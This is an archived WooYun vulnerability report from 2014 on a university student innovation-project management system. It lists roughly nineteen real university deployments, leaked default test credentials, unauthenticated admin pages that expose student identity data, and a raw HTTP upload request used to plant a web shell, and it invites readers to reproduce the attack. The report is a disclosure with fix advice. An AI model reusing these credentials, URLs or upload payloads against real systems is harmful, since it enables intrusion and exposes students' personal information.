{"id": 41412, "wybug_id": "wooyun-2014-088903", "wybug_title": "某通用型大学生管理系统非授权访问", "wybug_corp": "南京先极科技有限公司", "wybug_author": "路人甲", "wybug_date": "2014-12-30 14:40", "wybug_open_date": "2015-03-30 14:42", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向公众公开  简要描述： 1#操作手册泄漏测试用户及密码2#非授权访问，可直接获取系统内所有用户关键信息3#一枚任意文件上传漏洞 详细说明：  注意与其不同 WooYun: 某通用型创新管理系统普通帐号可越权查看及修改任意用户（影响多所高等院校） 官网：http://www.changedu.com/由南京先极科技有限公司开发的大学生创新创业训练项目智能管理系统关键字：大学生创新创业项目智能管理系统影响案例：http://desktop.nju.edu.cn/cx/ 南京大学大学生创新创业训练智能管理系统http://dxscx.forestpolice.net/ 南京森林警察学院大学生创新创业训练智能管理系统http://180.209.64.18/cxcy/Index.aspx 南京邮电大学大学生创新创业训练智能管理系统http://210.26.14.200/ 西北民族大学大学生创新创业训练项目智能管理系统http://sjjx.njit.edu.cn/cx/ 南京工程学院大学生创新训练智能管理系统http://nausrt.njau.edu.cn/ 南京农业大学大学生创新训练智能管理系统http://202.195.237.148/dcxm/Index.aspx 南京信息工程大学生创新训练智能管理系统http://sy.cxxy.seu.edu.cn/cx/ 东南大学成贤学院大学生创新训练智能管理系统http://cx.njxzc.edu.cn/ 南京晓庄大学生创新训练智能管理系统http://210.38.64.108/cx/ 广东第二师范学院大学生创新训练智能管理系统http://cx.yctc.edu.cn/ 盐城师范学院大学生创新训练智能管理系统http://cxsb.yzu.edu.cn/ 扬州大学大学生创新训练智能管理系统http://cxcy.shisu.edu.cn/ 上海外国语大学大学生创新创业项目智能管理系统http://cxcy.lzu.edu.cn/Index.aspx 兰州大学大学生创新创业项目智能管理系统http://210.46.116.20/ 哈尔滨商业大学大学生创新创业项目智能管理系统http://jw1.jiangnan.edu.cn/dxscx/ 江南大学大学生创新创业项目智能管理系统http://202.119.81.120/ 南京理工大学大学生创新创业项目智能管理系统http://bylw.pk.njau.edu.cn/gxycx/ 南京农业大学大学生创新训练智能系统等等不一一列举   漏洞证明：  以西北民族大学大学生创新创业训练项目智能管理系统为例\nhttp://210.26.14.200\n入侵思路：试探admin弱口令，及登录注入，无突破，想到大部分校园系统学号即密码，又懒得去找，最后发现系统有个操作手册，下载之，发现了测试帐号1#操作手册泄漏测试用户及密码\nhttp://210.26.14.200/UpLoadFile/690476.doc\n\n\n\n\n\n\n\n\n测试帐号，可通用于大部分系统s1/1s2/1s1/s1s2/s2st1/1等等2#未授权访问地址（有多处，无需登陆，以下仅举关键2处）：2.1#\nhttp://210.26.14.200/Admin/SelStudent.aspx\n\n\n\n\n\n\n2.2#\nhttp://210.26.14.200/Admin/SelTutor.aspx\n\n\n可导出！部分版本显示字段可能不同，但一个系统里关键的用户数据能泄漏的都泄漏了，右键查看源代码，可获得身份证完整字段，密码即学号或教工号（部分版本密码未加密，明文存放）3#一枚明显的任意文件上传漏洞（以s1/1登录系统）\nhttp://210.26.14.200/HelperScripts//ftb.imagegallery.aspx?rif=image&cif=image\n上传抓包改包（上传路径可改，cookie注意替换）\nPOST http://210.26.14.200/images/Upload.axd?frame=1&rif=image&cif=image&File=ImagesData/s11542/9803 HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1KM7cH2GI3gL6ei4cH2GI3Ij5Ij5User-Agent: Shockwave FlashHost: 210.26.14.200Content-Length: 431Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=zowfhv4500ivgn45oqergc45; .loginAuth=1395AFF5A2701FEDFC6445C9D1BF33DE9C5306EB31C9F0DE0BFF002A94D133A5A2C02DA9AD2265D512F6E0EF7F2CF634DF41749B59E7270117ECF9BBF828A4012BC93DF101C34393501B0550E6505454------------Ef1KM7cH2GI3gL6ei4cH2GI3Ij5Ij5Content-Disposition: form-data; name=\"Filename\"wooyun.aspx------------Ef1KM7cH2GI3gL6ei4cH2GI3Ij5Ij5Content-Disposition: form-data; name=\"Filedata\"; filename=\"wooyun.aspx\"Content-Type: application/octet-streamwooyun test------------Ef1KM7cH2GI3gL6ei4cH2GI3Ij5Ij5Content-Disposition: form-data; name=\"Upload\"Submit Query------------Ef1KM7cH2GI3gL6ei4cH2GI3Ij5Ij5--\n上传路径http://210.26.14.200/ImagesData/s11542/9803/wooyun.aspx\n\n当然程序本身有做一些处理，无法直连上传后的一句话木马，大马上传的话，几个操作后就会timeout;经过测试发现，将一句话上传到admin目录后，可以直连，并无异常情况发生，剩下的无需多言。上刀：\n\n\n\n以下案例供复现：http://desktop.nju.edu.cn/cx/Admin/SelStudent.aspx\n\nhttp://desktop.nju.edu.cn/cx/HelperScripts//ftb.imagegallery.aspx?rif=image&cif=imagehttp://dxscx.forestpolice.net/Admin/SelStudent.aspxhttp://180.209.64.18/cxcy/Admin/SelStudent.aspxhttp://sjjx.njit.edu.cn/cx/Admin/SelStudent.aspxhttp://nausrt.njau.edu.cn/Admin/SelStudent.aspxhttp://202.195.237.148/dcxm/Admin/SelStudent.aspxhttp://sy.cxxy.seu.edu.cn/cx/Admin/SelStudent.aspxhttp://cx.njxzc.edu.cn/Admin/SelStudent.aspxhttp://210.38.64.108/cx/Admin/SelStudent.aspx复制好累，案例很多，大部分系统学号即密码   修复方案：  控制好页面的访问权限，上传点做好过滤最保险的还是首次登录强制修改密码   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-01-04 13:36 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向网站管理单位通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}